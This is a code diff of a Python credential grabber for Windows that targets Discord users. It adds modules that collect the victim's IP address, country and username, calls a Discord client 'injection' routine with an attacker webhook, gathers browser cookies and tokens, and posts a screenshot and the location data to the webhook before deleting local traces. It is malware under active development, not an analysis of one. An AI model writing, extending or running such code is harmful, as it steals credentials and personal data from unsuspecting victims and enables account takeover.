@@ -26,6 +26,12 @@ cc = Config()
 
 import injection
 
+import informations 
+ii = informations.Info()
+
+import _webhook
+_webh = _webhook.WebhookX()
+
 try:
     import requests
     from PIL import ImageGrab
@@ -44,12 +50,6 @@ except ModuleNotFoundError:
             
 if platform.system() != "Windows":
     quit()
-
-    
-def get_ip():
-    ip = "None"
-    ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-    return ip
 
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
@@ -72,10 +72,6 @@ roaming = os.getenv("APPDATA")
 temp = os.getenv("TEMP")
 Threadlist = []
 DETECTED = False
-
-
-payload = {"content": "**AYOOO GRABBED SOME DUMMY** ||@everyone||", "username": wh_name, "avatar_url": wh_avatar}
-response = requests.post(webhook, json=payload)
 
 class DATA_BLOB(Structure):
     _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]
@@ -135,23 +131,6 @@ def LoadUrlib(webhook, data="", files="", headers=""):
         return r
 
 
-
-def globalInfo():
-    ip = get_ip()
-    username = os.getenv("USERNAME")
-    ipdatanojson = (urlopen(Request(
-        f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace(
-            "callback(", "").replace("})", "}"))
-    # print(ipdatanojson)
-    ipdata = loads(ipdatanojson)
-    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
-    contry = ipdata["country_name"]
-    contryCode = ipdata["country_code"].lower()
-    globalinfo = f":flag_{contryCode}:   -   `{username.upper()}  -  {ip} [{contry}]`"
-    # print(globalinfo)
-    return globalinfo
-
-
 def Trust(Cookies):
     # simple Trust Factor system
     global DETECTED
@@ -165,9 +144,6 @@ def Trust(Cookies):
         DETECTED = False
         return DETECTED
 
-
-
-Tokens = ""
 dclass = discordc.DiscordX()
 
 def upload(name, link):
@@ -201,7 +177,6 @@ def upload(name, link):
             wh_avatar,
             "attachments": [],
         }
-        #urlopen(Request(webhook, data=dumps(data).encode(), headers=headers))
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
         return
 
@@ -230,10 +205,8 @@ def upload(name, link):
             wh_avatar,
             "attachments": [],
         }
-        #urlopen(Request(webhook, data=dumps(data).encode(), headers=headers))
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
         return
-
 
 Tokens = ""
 dclass = discordc.DiscordX()
@@ -906,7 +879,7 @@ OtherZip = []
 
 GatherAll()
 #RobloxCookie()
-injection.Injection(webhook)
+injection.InjectionX(webhook)
 DETECTED = Trust(Cookies)
 DETECTED = False
 if not DETECTED:
@@ -973,3 +946,5 @@ files = {"screenshot": open("screenshot.png", "rb")}
 requests.post(webhook, files=files)
 files["screenshot"].close()
 os.remove("screenshot.png")
+
+_webh.locations_webhook(ii.global_info())
